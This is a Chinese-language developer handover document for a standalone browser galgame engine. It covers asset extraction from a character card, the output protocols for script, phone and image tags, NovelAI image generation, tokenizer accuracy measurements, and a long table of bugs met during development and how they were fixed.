# 交接文档 · gal 引擎

> 写给「接手这个项目的下一个人」——可能是另一个 AI，也可能是几个月后的你自己。
> 读完这份应该能独立继续开发，不需要回看聊天记录。

---

## 一、这是什么

一个**独立运行的 galgame 前端**。浏览器打开一个 `index.html` 就能玩：
填 API 密钥、导入角色卡和预设，模型生成剧情，前端把剧情演成
「背景 + 立绘 + 对话框 + 手机 + 存档」的 galgame 界面。

不依赖 SillyTavern（酒馆），不需要装任何东西，可以直接挂 GitHub Pages。

---

## 二、三个素材来源

### 1. juus 角色卡（主要内容来源）

文件名：`juus_之奶猫崛起.json`，2.1MB，SillyTavern V2 角色卡。
作者 kikukiku，碧蓝航线同人，群像卡（没有单一主角）。

**从里面抽出来的东西**（用 `tools/` 下的脚本，不是手抄）：

| 内容 | 抽到哪 | 数量 |
|---|---|---|
| `EXPRESSION_MAP` 表情差分 | `resource/juus/expressions.js` | 73 角色 / 3519 张 |
| `DEFAULT_SPRITES` 默认立绘 | `resource/juus/defaults.js` | **761 角色 / 2200 张** |
| `SCENE_MAP` 场景表 | `resource/juus/scenes.js` | 163 张背景 |
| 小手机的头像/表情包/群组/种子内容 | `resource/juus/phone.js` | 792 头像 / 153 表情包 / 9 群 |
| 小手机的样式 | `resource/juus/phone.css` | 16KB，已加 `#jup-root` 命名空间。**不进仓库**，我们另写了 `app/phone-inner.css` 顶上 |
| 世界书 164 条 | 运行时由用户导入，**不打包** | — |
| 7 个开场白 | 运行时从卡里读 | — |

**没有抽的**：CG 素材表（成人内容）、那段 112KB 的原始手机脚本
（自带 mask/ball 浮层，和这边布局冲突，解析逻辑照搬了但界面重写）。

图片全部挂在 Hugging Face 和 catbox.moe，仓库里只存 URL。

### 2. SatoriZeppelin/Larimar（引擎与交互的参考）

<https://github.com/SatoriZeppelin/Larimar> —— 「SummerNight Plus（天青）」，
一个已经做好的独立 galgame 前端，46000 行。**这个项目最大的价值是它已经把
「脱离酒馆」这件事做完了**，所以很多轮子不用重造。

借鉴/搬运的：

- ~~`backend/regex.js`、`backend/preset.js` —— 原样放在 `core/vendor/`~~
  **v5.20 已全部删除**：查下来 `index.html` 从未加载它们，代码里也没有引用，
  是死代码。而 Larimar 没有任何许可声明，留着反而是个隐患。
  （`api.js` 更早就被自写的 `core/api.js` 取代了。）
- `prompt-builder.js` 的 `entryActivated()` —— 世界书激活逻辑的蓝本，
  我重写时补上了它简化掉的 `NOT_ANY`、`matchWholeWords`、递归触发
- **iPhone 机身 + 主屏 App 网格**的做法（`interface/phone.css`）
- **对话框的八个可调项**（透明度/底色/边框/模糊/位置/动态高度…）——
  我一开始只搬了三个，漏掉的「模糊度」和「动态高度」正是「糊了玻璃」「挡立绘」的原因
- 立绘表用**前缀命名服装**（`演出服wink`、`婚纱开心`）的思路
- twitter 式的横条时间线版式

天青自己的素材也带了一份：`resource/tianqing/`（75 立绘 / 31 背景），
两套素材可以同时加载，键名不冲突。

### 3. LingYuYue1/KaiTuoYiShi（视觉与信息架构的参考）

<https://github.com/LingYuYue1/KaiTuoYiShi> —— 「开拓轶事」，React + TypeScript + Tailwind。
代码搬不过来（这边是原生 JS），**借的是版式语汇**：

- 设置面板的**左侧导航 + 中间列表 + 右侧编辑器**三栏结构
- **统计磁贴**（中文标签 + 英文码 + 右侧大数字，可点选筛选）
- **方形图标框标题**（图标框 + 主标题 + 副标题）
- **左侧色条信息卡** + 自适应多列网格
- 伙伴页的**概览抬头卡**（头像 + 名字 + meta 标签串 + 右侧大数字）

它原本是暗金配色，这边改成了碧蓝。

---

## 三、目录结构

```
gal-engine/
├─ index.html              入口，双击就能跑
├─ app/
│   ├─ app.js              2121 行 —— 界面、渲染器、手机、设置工作台
│   ├─ style.css           舞台、对话框、立绘特效
│   ├─ phone-inner.css     ★ 手机屏幕里的组件外观（替掉卡自带的那份）
│   ├─ phone.css           iPad 机身、主屏、竖屏重排（**最后加载**）
│   └─ editor-theme.css    设置工作台的碧蓝皮肤
├─ core/
│   ├─ crash.js      210 行  ★ 全局错误兜底（必须第一个加载，不依赖任何模块）
│   ├─ engine.js     600 行  一轮对话的完整流程 + 变量 + 独立生成
│   ├─ cardres.js    330 行  ★ 载卡时从卡里直接抽立绘/场景/手机资源
│   ├─ worldbook.js  230 行  世界书激活（蓝灯绿灯/递归/预算/语义补捞）
│   ├─ imagegen.js   560 行  ★ NovelAI 出图（提示词编译 + ZIP 解包）
│   ├─ snapshot.js   440 行  ★ 正文 → 出图提示词（两段式 / 内联）
│   ├─ cg.js         250 行  ★ CG 编排：挑锚点、出图、挂到句子上
│   ├─ gallery.js    250 行  ★ 图片存 IndexedDB + 相册（存档只存 id）
│   ├─ tokens.js     130 行  ★ 真实分词（gpt-tokenizer，按需加载）
│   ├─ vector.js     310 行  ★ 世界书语义检索 + 时间衰减
│   ├─ prompt.js     240 行  提示词组装（prompt_order + marker）
│   ├─ script.js     292 行  剧本解析（两种字段顺序自动识别）
│   ├─ resolver.js   204 行  立绘/背景查找（多级兜底 + 别名）
│   ├─ phone.js      340 行  手机标签解析 + 独立生成的提示词
│   ├─ api.js        325 行  三种协议 + 流式 + 重试
│   ├─ editors.js    245 行  人设/预设/世界书的数据操作 + 内置规则条目
│   ├─ storage.js    171 行  IndexedDB → localStorage → 内存 三级降级
│   └─ vendor/             第三方原样文件，勿手改
│       ├─ gpt-tokenizer-cl100k_base.js   994KB
│       ├─ gpt-tokenizer-o200k_base.js   2.0MB  ← 默认用这个
│       └─ gpt-tokenizer-LICENSE.txt      MIT，npm gpt-tokenizer 2.9.0
│                                         两个都删会自动回退粗估，不报错
├─ resource/
│   ├─ aliases.js          166 条预置地名映射（我们自己整理的，进仓库）
│   ├─ README.md           下面两个为什么不在仓库里 + 怎么生成
│   ├─ juus/               ⛔ 不在仓库（.gitignore）· build-juus.py 生成
│   └─ tianqing/           ⛔ 不在仓库（.gitignore）· build-tianqing.py 生成
├─ tools/
│   ├─ build-juus.py       从 juus 卡重新生成素材表
│   ├─ build-tianqing.py   从 Larimar 仓库重新生成
│   ├─ build-phone.py      抽手机资源与样式
│   ├─ build-fixtures.mjs  ★ 从真表生成测试用的合成表（URL 全占位）
│   ├─ measure-tokens.mjs  ★ 复现「粗估差多少」那张表
│   ├─ e2e-card.mjs     ★ 真浏览器验「没素材包也能靠卡演出来」（需 playwright）
│   ├─ e2e-saves.mjs    ★ 真浏览器验「玩A→退出→开B→回到A」（需 playwright）
│   ├─ e2e-crash.mjs    ★ 真浏览器验错误兜底页与输入法组合态（需 playwright）
│   ├─ e2e-backup.mjs   ★ 真浏览器验「导出→清空数据→导入」往返（需 playwright）
│   ├─ smoke-test.js       ★ 383 项冒烟测试（jsdom 真跑 index.html）
│   └─ unit/               ★ 340 项单测，run-all.mjs 一次跑完
└─ test/
    ├─ fixtures/resource.js ★ 合成素材表（自动生成，进仓库）
    ├─ resources.html      素材验证台（翻图、查坏链）
    └─ inspector.html      引擎检视台（干跑，不发请求）
```

---

## 四、数据流

```
用户输入
  → Vector.query()            语义补捞（可选，关键词捞不到的才补）
  → Worldbook.activate()      按关键词激活世界书条目，分七个插入位置
  → PromptBuilder.build()     按预设的 prompt_order 排序，替换 marker 占位
  → GalAPI.chat()             发请求（OpenAI / Anthropic / Gemini）
  → engine.processOutput()
       ├─ 剥思维链、剥 <content>
       ├─ Phone.strip()        摘掉手机标签（先解析后摘）
       ├─ applyUpdates()       解析 <UpdateVariable> 的 JSON Patch
       ├─ Snapshot.stripInline() 摘掉 <image>（必须早于切分事件流）
       ├─ 卡自带的短正则
       ├─ ScriptParser.parse() 切成事件流
       ├─ toModules()          算出每句的舞台阵容
       └─ Resolver             解析每句的立绘 URL 和背景 URL
  → app 渲染（背景交叉淡入、立绘双缓冲、打字机）
  → CG.runTurn()              ★ 另起一条线，不阻塞：
       ├─ pickAnchors()       这一轮哪几句值得配图
       ├─ Snapshot.resolveShots()  整轮**一次**请求拿回 N 个镜头
       ├─ ImageGen.generate() 串行出图（并发容易 429）
       └─ Gallery.put()       存 IndexedDB，把 id 挂到那句上
```

---

## 五、协议：模型要输出什么

### 剧本（juus 格式，**台词在前**）

```
『✨ 2081/09/17 · 星期三 · 22:47 · 港区商业街 · 晴 ✨』|旁白|-|
她抬起头。|柴郡|微笑|
「指挥官早呀。」|柴郡|高兴|
<choice>[选项A][选项B]</choice>
```

注意 Larimar（天青）是**角色在前**：`<天青|微笑|台词>`。
`ScriptParser.detectOrder()` 会靠「哪一段像人名」自动判断，两种都认。

地点写在 `『』` 抬头里 —— 不是 `<背景|>` 标签。解析时不按固定下标取段，
而是让每一段去场景表里试，挑匹配最好的当地点（各卡抬头格式不一样）。

### 立绘出入场（引擎自加的）

```
<退场|Z23>              <退场|Z23|Z52>      <退场|全部>
<登场|长门:微笑>         <登场|长门:微笑|柴郡:得意>
<立绘|天青:微笑|弥生:默认>   声明完整阵容（Larimar 格式）
```

正文中间随时可插。三套机制优先级：**显式退场 > 换地点自动清台 > 超 4 人淘汰最久没说话的**。

### 手机

```
[短信|角色名|文字|内容]          [短信|角色名|表情|贴纸名]
[群聊|群名|角色名|文字|内容]
[小红书|作者|标题|正文|赞|评论|收藏]
[评论|角色名|内容]               紧跟在对应 [小红书|…] 之后
[趋势|一句话]
```

### 插画（可选，只有「内联」模式才需要模型写）

```
<image>image###
Scene Composition: 场景英文标签;
Character 1 Prompt: 角色 1 的英文外观标签;
Character 2 Prompt: 角色 2;
###</image>
```

**必须写在正文之外**，和 `<UpdateVariable>`、`[短信|…]` 一个位置。
天青在这里栽过两次，都值得记住：

1. 它原先让模型写在 `<Gal>…</Gal>` **里面**，外层正则把整块吃掉换成 iframe，
   出图脚本根本看不到那个标签。
2. 块里的 `Character 1 Prompt:…|centers:c3` 含 `|`，而剧本行正是用 `|` 分段的 ——
   不在切分事件流**之前**整块抠掉，就会被切成一串假台词演出来。

`engine.processOutput()` 里这一步排在 `ScriptParser.parse()` 之前，别挪位置。

默认模式是「两段式」，不需要模型写这个 —— 由 `Snapshot` 另发一次请求解析正文。

### 变量（MVU 格式）

```
<UpdateVariable>
<Analysis>…</Analysis>
<JSONPatch>
[ { "op": "replace", "path": "/地点", "value": "重樱神社" },
  { "op": "delta",   "path": "/人物/柴郡/好感度", "value": 8 },
  { "op": "insert",  "path": "/人物/雅努斯", "value": {…} },
  { "op": "remove",  "path": "/人物/柴郡/服装" },
  { "op": "move",    "from": "/a", "to": "/b" } ]
</JSONPatch>
</UpdateVariable>
```

**这是 RFC 6902 JSON Patch，不是 `_.set()`。** 我一开始按 `_.set()` 写解析器，
结果一条都没解析成功，地点/好感度/在场全程不动 —— 这是整个项目最隐蔽的一个 bug。
旧的 `_.set()` 写法仍然兼容（含 MVU 的三参数形式）。

---

## 六、两条独立于主线的生成通道

**手机私聊/群聊/评论不走主线**，各自发一次性请求，不写主线历史、不占回合。
这是照 juus 原脚本的设计（它用酒馆的 `generateQuietPrompt`）。

- `engine.quiet(prompt)` —— 发一次性请求
- `engine.quietContext(scanText, {who})` —— 给它准备上下文：
  拿角色名去激活世界书取她的人设，配上当前地点/时段/在场和最近 8 句剧情
- `engine.renderPhoneLog()` —— 把手机记录压成 `<手机记录>` 注入主线

**两边互相可见**：剧情里的人知道你在手机上说过什么，反过来主线输出的
`[短信|…]` 也会出现在手机里。群聊的原始输出写进 history 但标 `phoneOnly`，
主线组装时跳过，避免同一份内容发两遍。

---

## 六·五、文生图与 CG（v5.20 新增）

### 为什么这一层必须自己写

两个参考项目的路子完全不同，值得先讲清楚，免得下一个人跑去抄错的那边：

- **天青自己不会出图**。独立版设置里那个「文生图」页签点进去只有一行
  「文生图相关设置将在这里配置」，是占位。能跑的那套在 `手机.html`，
  而那个文件**依赖酒馆**：「🎨 生成」按钮做的是调斜杠命令
  `/imagine quiet=true <prompt>`，三条路依次试（`triggerSlash` →
  `TavernHelper.triggerSlash` → `executeSlashCommandsWithOptions`），
  出图的活儿全交给酒馆的扩展或用户装的油猴 NAI 脚本。
  **能抄的是协议和 tag 表，不是出图代码。**

- **开拓轶事有完整实现**，而且是纯 `fetch`、服务层不碰 React，
  逻辑可以原样移植：`services/ai/imageGeneration.ts`（1145 行，四种后端）
  + `services/ai/novelaiPromptCompiler.ts`（360 行，NAI V4 的多角色分段）。
  我们的 `core/imagegen.js` 就是从这两个文件移植的。

### 两段式 vs 内联，以及为什么默认两段式

天青让剧情模型直接在正文里写好 NAI 的三段式 prompt —— 零额外成本，
但完全依赖模型肯写、且写得对。

开拓轶事是两段式：剧情模型只管写中文正文，**另发一次请求**给「快照解析」，
让它按固定 JSON Schema 把正文压成结构化的渲染上下文。出图质量明显更稳
（角色外观由档案和世界书决定，不靠模型每次即兴发挥），代价是每轮多一次请求。

我们两条都实现了，默认走两段式，`设置 · 文生图 · 提示词来源` 可切。
解析那一步复用 `engine.quiet()` —— 手机私聊那条独立通道，
它本来就会带上世界书激活的人设和最近剧情，等于白捡一份上下文，不用新造管线。

**省 token 的一处设计**：Schema 用 `shots` 数组，每轮要 2 张图也只解析一次。
一张图一次请求的话，解析开销会直接翻倍。

解析失败（模型不给 JSON、请求报错）会退回 `Snapshot.localDraft()` ——
按地点关键字转通用环境词（`神社 → shrine, torii gate`），
质量肯定不如模型解析，但保证还能出图，不会让整条链路死掉。
草稿**不编造角色外观**，只给名字 —— 瞎写发色不如不写。

### CG 就是生成的图

原来 CG 要手工准备素材表。现在反过来：`core/cg.js` 每轮挑 1~2 句当锚点，
出图，把图的 id 挂到 `eng.log[i].cg` 上。玩家游标走到那句就铺上，翻回去也在。

锚点按「画面变化量」打分：换背景 +3、有人上台 +2、台上 ≥2 人 +1、
旁白 +1.5（旁白写的就是画面描写，台词写的是对话）、长句最多 +1.5。
挑最高的 n 句，但**强制彼此隔开** `floor(句数/(n+1))`，免得两张图画连着的两句。

**全程异步**。NAI 出一张十几秒到半分钟，让玩家干等不可接受，所以是
「先演，图后到」：图到了如果玩家正好停在那句，界面自己补上。
新一轮开始会掐掉上一轮还没出完的图（玩家已经翻篇了，旧图没意义还占额度）。
出图**串行**不并发 —— NAI 并发容易 429，而且串行才好中途取消。

### 重画

`CG.regenerate({eng, logIndex, cfg, quiet, body})`。三个入口都接在这上面：
CG 图右上角的 ♻、相册每张图的 ♻、相册顶部那条（**没有图的句子也能补**）。

两个细节别改坏：

- **上下文用整轮正文**（`turnBodyOf()` 把同一 `turn` 的句子拼起来），
  不是孤零零那一句。一句「嗯。」解析不出画面，而且生成时本来就按整轮解析，
  重画不一致会出来两种画风。
- **收藏（★）过的旧图不删**。玩家点 ★ 就是明确说「这张要留着」，
  重画只换掉这一句挂的图。

重画会掐掉正在跑的那一轮出图（`runTurn` 里的 `running.abort()`）——
这是故意的：NAI 并发容易 429，而且玩家手动发起的优先级更高。

### 私信 vs 群聊：谁在跟谁说话

`[短信|角色名|文字|内容]` 的语义是「这个角色**单独发给指挥官**的私信」，
收件人永远是指挥官。但模型很爱拿它写舰娘之间的对话 —— 实测截图里就是：

```
[短信|Z52|文字|Z9！！！你看到了吗！Z47坐在指挥官大腿上了！！！]
[短信|Z9 |文字|Z52……你现在不是应该在做第七题吗……]
```

这俩在互相说话，却各自躺在「和指挥官的私聊」里，指挥官被夹在中间。

两道防线：

1. **世界书**（`PHONE_RULE_TEXT`）写了正反例，明确
   「说话对象是指挥官 → 短信；说话对象是别的舰娘 → 群聊」。
2. **引擎**（`Phone.peerDirected()`）再拦一道，因为模型照样会错。两个信号：
   开头是呼格且那个名字是**别的已知角色**；或者把指挥官当**第三人称**提
   且通篇没有第二人称。命中就改投到 `PEER_GROUP`（「舰娘闲聊」）。

⚠ 判断是**按「发信人 + 本轮」整组**做的，不是逐条。一组里只要有一条露馅，
整组都跟着走 —— 「别转移话题！」这种单看毫无线索，但它和前一句属于同一段对话，
不能一半在私聊一半在群里。同理「……看到了。」排在呼格那条**前面**，
逐条判断会漏掉它，整组判断才抓得到。

⚠ 呼格检测要**先放行以指挥官称呼开头的**：「指挥官，早呀～今天也要加油哦」
里出现了「指挥官」又通篇没有「你」，不先放行就会被第三人称信号误判。
称呼取自设置里的「你的称呼」，不是写死的「指挥官」。

### 开场引导

`index.html` 里的 `#boot`，四步向导（素材 / 接口 / 插画 / 开场），
逻辑在 `app.js` 的 `BOOT_STEPS` / `renderBoot()` / `bootDone()`。

改的时候注意两件事：

1. **老界面的输入框 id 一个都不能丢** —— `f-card`、`cfg-key`、`opening-sel`、
   `btn-start` 这些 app.js 全靠它们找元素。冒烟测试 [1b] 逐个盯着，别删。
2. 背景全是 CSS 画的（渐变 + 三层 `border-radius` 极大的椭圆假装波浪 + 网格遮罩），
   不引任何图片。想换风格改 `#boot .boot-bg` 那几条就行。
   有 `prefers-reduced-motion` 的分支，别忘了同步。

`bootDone(k)` 决定左栏那个点变不变绿。「插画」那步比较特殊：**没开也算处理过了**，
因为它本来就是可选的，不能让它一直红着。

### 图不能进存档

一张 dataURL 1~2MB，每轮 1~2 张，几十轮就是上百 MB。
`core/gallery.js` 的存在就是为了这条：图片本体各自一条 IndexedDB 记录（`img:<id>`），
一份不含图片本体的索引（`gallery:index`）供列表用，**存档里只存 id**。
`Gallery.forSave()` 就是这条规矩的落地点。

超 200 张淘汰最旧的；玩家收藏（★）的永不淘汰 —— 和手机动态「种子内容永远保留」
是同一个道理。IndexedDB 不可用时图只留内存并标 `volatile`，`forSave()` 会跳过它们
（读档回来必然失效，存了也是坏引用）。

### NAI 的四个坑

1. **它回的是 zip 不是 png，而且是「流式」zip**。这条实测栽过一次，一定要记住：
   NAI 边生成边回传，**本地文件头里的压缩长度写的是 0**，真实长度在数据**之后**的
   data descriptor 里（general purpose flag 的 bit 3）。只顺着本地文件头扫会直接扑空，
   报「返回了压缩包，但里面没找到 PNG」—— 前后端全对、图也生成了，就挂在最后这一步。

   正解是**读文件末尾的中央目录**，那里的长度永远是对的。
   `findImageEntry()` 是三级：中央目录 → 本地文件头 → 单流兜底（扫到
   data descriptor 签名为止）。解压用浏览器内置的
   `DecompressionStream('deflate-raw')`，零依赖，不用引 JSZip。
   单测里造了六种 zip 形态盯着它（`tools/unit/test-imagegen.mjs` 第 8 节）。
2. **V3 不能带 `v4_prompt`**，带了就 400。按模型档案的 `characterPrompts` 判断。
3. **免费档有两道门槛**：总像素 ≤ 1,048,576 **且** 步数 ≤ 28，两条都要满足。
   默认的 1216×832（= 1,011,712）配 23 步正好卡在里面，设置页会实时算给你看。

4. **CORS 不是问题 —— 实测浏览器可以直连 `image.novelai.net`**（file:// 打开的页面也行）。
   之前只是推测，现在有实证了。所以不需要中转；设置里那个「接口地址」留着以防万一。

还有一条不是 NAI 的坑而是浏览器的：fetch 被 CORS 拦下时抛的是
`TypeError: Failed to fetch`，浏览器出于安全不会告诉脚本原因。
这一步**还没到验密钥**，所以必须和「密钥错」分开报，
不然用户会一直去换密钥。`describeNetworkError()` 干的就是这件事。

### 提示词默认走「AI 每轮输出」，不是两段式

v5.20 初版默认两段式（每轮多发一次解析请求）。改了：现在**打开文生图的开关，
就自动启用世界书里那条「【引擎】插画输出规则」**，它是【持久指令】，
让 AI 每轮自己产出 1~2 段 `<image>`，引擎直接拿来出图 —— **不额外花钱**。
某轮 AI 忘了写才退回解析兜底。开关和规则的联动在 `syncImageRule()`。

那条规则的格式抄的是用户给的油猴世界书（nai4 改 9），那套在实战里跑通过：
`Character N Prompt` 和 `Character N UC` **成对**出现（每个角色各自带负面词，
用来把角色之间互相串味的特征排掉）、`|centers:x,y` 给站位、
`source#` / `target#` 标明两个角色接触时谁主动谁被动。
`Snapshot.parseInline()` 这三样都认；centers 解析不出坐标就丢掉，
由 `imagegen` 按人数横向均分。

### ▣ 是个真开关，只有两种状态

- **开（默认）** CG 模式：CG 盖住立绘，`nearestCG(qi, false)` 跨轮往前找，
  一旦铺上就留到被下一张换掉为止。
- **关** 立绘模式：`syncCG()` 第一行直接 `hideCG()`，舞台上**永远不出 CG**。

中间试过一版「关 = 只在图所在那一句显示」，错了：一轮出 1 张图时，
关掉之后照样时不时盖上来，按钮看着像坏的。二选一才说得清。

顺带：图只挂在某一句上，只在那一句显示的话推一下就没，画面闪一下很难看 ——
所以开着的时候一定要往前找，这是 `nearestCG` 存在的理由。

## 六·六、token 计数与世界书语义检索（v5.20 新增）

### 粗估到底差多少 —— 别再凭感觉

原来的规则是「CJK 1 字 1 token，其余 4 字符 1 token」。实测
（`node tools/measure-tokens.mjs`，脚本在仓库里，别信这张表自己跑）：

| 样本 | 字符 | 粗估 | cl100k | 误差 | o200k | 误差 |
|---|---:|---:|---:|---:|---:|---:|
| 纯中文（无标点） | 28 | 28 | 35 | −20% | 23 | **+22%** |
| 带标点对白 | 21 | 17 | 30 | **−43%** | 22 | −23% |
| 剧本行 `她抬起头。\|柴郡\|微笑\|` | 12 | 9 | 16 | **−44%** | 14 | −36% |
| 世界书人设 | 149 | 131 | 207 | −37% | 141 | −7% |
| JSON 变量 | 46 | 26 | 33 | −21% | 28 | −7% |
| 英文 prompt | 122 | 31 | 30 | +3% | 30 | +3% |
| **合计** | | **242** | **351** | **−31.1%** | **258** | **−6.2%** |

以 cl100k 为准整体低 **31%**，最坏 −44%。以 o200k 为准只低 6%。
「粗估差多少」这个问题没有单一答案，取决于目标模型的词表 —— 这点比具体数字更重要。
世界书的预算裁剪正是按这个数裁的，低估等于「以为还有空间」，实际发超；juus 是大卡，会放大。

`core/tokens.js` 接了 gpt-tokenizer 2.9.0（MIT，Bazyli Brzoska，npm 官方 UMD 构建），
按模型名选编码，**用到时才插 `<script>`** 加载那 1~2MB 的文件。
世界书预算多了 `budgetTokens` 这条路（`设置 · 接口 · 世界书预算` 可切），
**默认仍是按字符**，不动既有手感。

三条限制界面上也写着：
- 这是 OpenAI 的分词器，对 **Claude / Gemini 是估算**（它们的分词器不公开）。
- **认不出的模型默认走 o200k**（`encodingFor()` 里只有 `gpt-4`/`gpt-3.5`/`text-embedding-*`
  走 cl100k）。这是判断不是实测：现代模型词表更大，行为更接近 o200k。有账单以账单为准。
- `core/vendor/gpt-tokenizer-*.js` 合计 3MB，嫌包大**可以直接删掉**，
  会自动回退粗估，不报错。

> **⚠ 两次勘误，交接的人请读。**
> 这张表在 v5.20 开发过程中登过两版错的数（先「−40~60%」，后「整体 −11%、纯中文高估」）。
> 根因：当时的 `core/vendor/gpt-tokenizer-cl100k_base.js` 是从 Larimar 的 vendor/ 直接拿的，
> 而**那个文件里装的是 o200k 的数据**——它与同目录的 o200k 文件对同一段中文返回完全相同的
> token 数（npm 官方的两个文件则不同）。用错的文件当 cl100k 量，自然得出错的结论。
> 现在两个 vendor 文件都换成 npm 2.9.0 官方构建，测量脚本 `tools/measure-tokens.mjs`
> 一并入库。**教训：第三方 vendor 文件的文件名不能当元数据信，要验证内容。**

### 语义检索：为什么是调 API 而不是塞个模型进浏览器

关键词激活是**字面**命中。玩家说「想吃点甜的」，一个关键词都不沾「甜品厅」那条，
就是捞不上来。`core/vector.js` 补的是这个漏。

浏览器内嵌 embedding 模型（transformers.js）要下三十到一百多 MB 权重，
对一个「双击 index.html 就能玩」的项目太重。所以复用用户已经配好的端点的
`/v1/embeddings`：

- 建索引是**一次性**的 —— 166 条各算一次，按「模型+维度+内容」的哈希缓存，
  改过的条目才重算。不会每次都花钱。
- 每轮只多一次「把当前这句转成向量」的请求，极小极便宜。
- 很多中转只转发对话接口、不转嵌入接口（404）。这时**静默退回纯关键词**，
  `query()` 返回空数组而不是抛错 —— 这一层绝不能挡住游戏。

**时间衰减**是配套的：光按相似度捞，同样那几条会永远最近、反复霸占预算。
所以最近几轮注入过的条目降权：刚注入 ×0.55，隔 3 轮 ×0.78，隔 6 轮完全恢复
（`decayTurns` / `decayStrength` 可调）。蓝灯常驻不参与，它们本来就该每轮都在。

⚠ 这一层只**追加**候选，永远不会挤掉关键词已经命中的条目。
关键词是作者写死的意图，语义相似只是补充。实现上 `engine.semanticHits()`
会先按关键词跑一遍、把命中的传进 `exclude`，再去补漏。

## 七、踩过的坑（别再踩一遍）

| 症状 | 真因 |
|---|---|
| 手机一片空白 | `app.js` 里写了 `global.PHONE_RES` —— `global` 是 Node 的，浏览器没有 |
| 变量永远不更新 | 格式是 JSON Patch 不是 `_.set()` |
| 背景全程空白 | 地点写在 `『』` 抬头里，我只认 `<背景|>` 标签 |
| 点设置跳到启动面板 | `openApp()` 里留着旧的 `if (k === 'cfg') return` |
| 私聊/群聊切不动 | 竖屏适配把 `.sub` 写死成 `display:block`，两个面板永远同时显示 |
| 设置整块半透明看不清 | `.ph-layer.app` 是两个类，权重压过了单类的 `.kt` |
| 点击时闪白条 | 动态高度用 `height:'auto'` 往返 + 塞在打字机里，每秒 38 次强制重排 |
| 有几句不显示 / 卡死 | `present()` 丢了并发令牌，旧回调盖掉新句子并把 `typing` 卡成 true |
| 没说话的人也在动 | 46% 的表情是多图差分，每句重新随机抽图 |
| 手机消息顺序错乱 | 用 `history.length` 排序，但私聊不写历史，连发两条 turn 相同 |
| 帖子两个一样的头像 | 缩略图和作者头像都回落到同一张 |
| 帖子正文满屏 `**` `[[` | 那是 `**粗体**` 和 `[[青:高亮]]` 标记，要渲染不是转义 |
| 世界书捞到「柴郡差分」 | 那是立绘名单不是人设；而且真人设 6891 字被预算先裁掉了 |
| 六百多个舰娘没立绘 | 只抽了 `EXPRESSION_MAP`（73 人），漏了 `DEFAULT_SPRITES`（761 人） |
| 默认立绘补了还是上不了台 | `toModules()` 判断"有没有立绘"只看 `characters`，没看 `defaults` |
| 变量编辑按钮点了没反应 | `$('x') && document.addEventListener(...)` —— 元素还没建，短路导致监听没挂上 |
| 出图 prompt 被演成台词 | `<image>` 块里的 `\|centers:c3` 含 `\|`，没在切分事件流前摘掉 |
| 存档几轮后就废了 | 生成的图是 dataURL，一张 1~2MB。**存档只能存 id**，图另放 IndexedDB |
| NAI 返回的不是图 | 它回的是 **zip**，里面才是 png。要自己解（`DecompressionStream('deflate-raw')`）|
| NAI V3 报 400 | V3 没有 `v4_prompt` 字段，带上就 400。要按模型档案判断 |
| NAI 开始扣点数 | 免费档有两道门槛：总像素 ≤ 1,048,576 **且** 步数 ≤ 28，两条都要满足 |
| 换密钥换半天没用 | fetch 被 CORS 拦下时抛的是 `TypeError: Failed to fetch`，那一步**还没到验密钥**。这两类错必须分开报 |
| 语义检索没反应 | 多数中转只转发对话接口，没有 `/v1/embeddings`（404）。这时要静默退回关键词，不能挡路 |
| 冒烟测试莫名挂 3 项 | 是测试自己写错：主页键是**分级返回**，点一次到不了主屏；另两项没角色卡本来就不成立 |
| NAI 说「压缩包里没找到 PNG」 | 它是**流式 zip**，本地头长度写 0，真实长度在尾部的 data descriptor。要读中央目录 |
| 设置页文字糊成一团 | `.kt-sw` 是 36×20 的**开关本体**，不是标签容器。文字写进去会整段溢出。正确写法是 `kt-row` + 独立 `kt-label` |
| 改了 CSS 完全不生效 | 手机壳的 `resource/juus/phone.css` 里有 `#jup-root *{padding:0}`，**ID 特异性**，普通类选择器压不过。要提权就得也带 `#jup-root` |
| 用 `<aside>` 做布局，元素被拽到右边 | `style.css` 里有一条**裸元素选择器** `aside{position:absolute;right:0;width:440px}`（老侧栏留下的）。做新布局别用 `<aside>`，或者提权盖掉 |
| 锁了皮肤一点「下一句」就跳回去 | 一轮的立绘是 `processOutput` 里**一次性**全解析好的。只重刷当前这句，后面几句还是旧的。要 `refreshSpritesFor()` 把整条日志里这几个角色重解析一遍 |
| 文档里的分词误差表错了两版 | 用的 `gpt-tokenizer-cl100k_base.js` 是从 Larimar vendor/ 拿的，**那文件里装的其实是 o200k 数据**。第三方 vendor 的文件名不是元数据，要验内容 |
| 载了卡舞台还是空的 | `loadCard()` 压根没读立绘 —— 那一步只存在于离线的 build-juus.py 里。见七·六 |
| 卡里一段代码被插得满正文都是 | 那条正则脚本没有 `findRegex`，空正则在每个字符缝隙都匹配 |
| 除了有差分的角色全裂图 | 两件事叠一起：① `randomSkin` 默认 true，从全部皮肤里随机抽，抽中死链；② `swap()` 覆盖掉了 `makeChar()` 里"挂了就隐藏"的 onerror |
| 图明明挂了却当成加载成功 | 缓存命中时 `onload` 不触发，而**失败的图 `complete` 也是 true**。要再判 `naturalWidth > 0` |
| 换个开局玩，上一局存档没了 | `autosave()` 固定写死 `'auto'` 一个槽，所有周目共用 |
| 读档后剧情记录是空的 | 「继续上次」只恢复了 history 和 vars，漏了 log/cursor/phoneSent/phoneSeq —— 同一件事写了两份，其中一份写残了 |
| 载入角色卡就被偷密钥 | `cardres.js` 曾用 `new Function` 求值卡里的字面量。**解析卡永远不能执行卡里的代码** |
| 快速翻页立绘变回旧表情 | 1.5s 内两次 `swap` 共用同一个 `<img>`，后者覆盖前者的 onload，前者的兜底定时器把旧图推回前台 |
| 设置页所有东西贴着边 | `#jup-root *{padding:0}` 是 (1,0,0)，`.kt-*` 压不过。**只提权一两条不够，得全量** |
| 手机里自己的回复排在对方原话前面 | `phoneSeq` 从 1 开始，剧情短信的 turn 是 history 下标，两套编号混排 |
| 点导入的世界书条目，打开的是卡里另一条 | 两边 uid 都退化成数组下标 0,1,2…，撞车 |
| 界面突然「点了没反应」 | 没有任何全局错误兜底，渲染路径抛了就断在那儿，错误只进控制台 |
| 拼音选词按回车，半截话被发出去 | 三处 Enter 都没判 `e.isComposing` |
| 网络一抖，写的两百字没了 | `submit()` 在发请求前就清空输入框，catch 里不还原 |
| 一遇限流就放弃 | `isTransient` 的正则里没有 429；也不读服务端给的 `Retry-After` |
| 本地打开和网址上的存档对不上 | `file://` 和 `https://` 是两个源，IndexedDB 不互通。不是 bug |
| 导出的存档位置比当前旧一句 | 自动存档只在生成完一轮时触发，翻页不触发。导出前要先落盘 |
